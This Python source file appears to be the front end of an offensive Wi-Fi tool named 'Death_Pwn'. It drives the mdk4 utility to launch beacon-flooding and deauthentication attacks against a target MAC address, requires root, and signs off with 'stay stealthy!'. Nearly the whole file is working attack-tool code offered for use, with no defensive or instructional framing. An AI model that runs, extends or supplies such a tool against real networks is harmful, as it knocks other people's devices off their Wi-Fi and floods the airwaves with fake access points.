import re
from basics import *
from mdk4 import *

def func_list():
    logo("Functions")
    typewriter.all_color([
        ("Beacon Flooding", "bold bright_cyan"),
        ("\nWi-Fi Deauther", "bold bright_cyan"),
        ("\nOthers are Comming soon", "bold bright_cyan"),
        ("\n            till you can buy me a coffee ♥ for my motivation-\n\n\n\n", "magenta")
    ], dealay=0.01)

def command_handler(command):
    command = command.lower()
    num = None
    mdk = None
    try:
        if "beacon" in command and "flooding" in command:
            num = 1
            for word in beacon_dict:
                match = re.search(rf"(\d+)\s*{word}", command)
                if match:
                    packet = match.group(1)
                    mdk = mdk4(interface=int_face, mode="b", count=packet)
                    break

            else:
                new_page()
                typewriter.yellow("For starting beacon flooding give numbers of pakets ")
                packet = Prompt.ask("#~ ")
                while not packet.isdigit() or int(packet) <= 0:
                    typewriter.red_bright("Invalid packet count! Must be a positive integer")
                    packet = Prompt.ask("#~ ").lower()
                    return
                mdk = mdk4(interface=int_face, mode="b", count=packet)
                num = 1
            
        elif "deauth" in command:
            num = 2
            # Improved regex to handle various command formats
            mac_match = re.search(
                r"(?:for\s+)?([0-9a-fA-F]{2}(?:[:-][0-9a-fA-F]{2}){5})", 
                command
            )
            
            if mac_match:
                mac = mac_match.group(1)
            else:
                while True:
                    mac = Prompt.ask("[bold bright_green]For starting Deauther, enter target MAC (e.g., 00:11:22:33:44:55)#~ [/bold bright_green]")
                    
                    # Validate MAC format
                    if re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac):
                        break
                    else:
                        typewriter.red_bright("Invalid MAC format! Please use 00:11:22:33:44:55 or 00-11-22-33-44-55")
            
            mdk = mdk4(interface=int_face, mode="d", bssid=mac)
            

        else:
            typewriter.red_bright("command not recognized!")
            
    except Exception as e:
        print("error occure in command_handler: ", e)
    
    try:
        if num == 1:
            mdk.beacon_flooding()

        elif num == 2:
            mdk.Deauther()

        elif num == 3:
            pass
        elif num == 4:
            pass
        elif num == 5:
            pass
        elif num == 6:
            pass
        elif num == 7:
            pass
        elif num == 8:
            pass
        elif num == 9:
            pass

    except Exception as e:
        print("error occure in command_handler number section: ", e)
    
    


def rootme():
    def group_func():
        clrscr()
        banner()
        delay(0.5)
        func_list()
        delay(0.5)
        while True:
            command_from_user = Prompt.ask(input_text).lower()
            if command_from_user in ["0", "exit", "bye", "/bye"]:
                mode.ma()
                typewriter.red_bright("EXITING...")
                typewriter.red("stay stealthy!")
                break  # Exit loop
            command_handler(command_from_user)
            completed()
            banner()
            func_list()
            return command_from_user
            

    if os.geteuid() !=0:
        typewriter.red_bright("Run Script as ROOT!")
        typewriter.red("Use 'sudo' command")
        typewriter.yellow("\n\nCorrect command#~ sudo python3 Death_Pwn.py")
        input()

    else:
        try:
            mode.mo()
            try:
                disclaim()
            except KeyboardInterrupt:
                clrscr()
            group_func()
        except KeyboardInterrupt:
            mode.ma()
            typewriter.red_bright("EXITING...")
            typewriter.red("stay stealthy!")
            delay(0.5)

def disclaim():
    clrscr()
    typewriter.cyan_bright("Death Pwn", dealay=0.15)
    typewriter.magenta_bright("   -Made with ♥", dealay=0.15)
    typewriter.green("   -By Dead Mafia", dealay=0.07)
    typewriter.yellow("\n\n\n\n   for the solution of any problem kindly visit my github -https://github.com/Deadmafiya/Death_Pwn/", dealay=0.05)
    typewriter.blue("\n", dealay=0.01)
    delay(0.5)
    clrscr()


if __name__ == "__main__":
    rootme()
    clrscr()
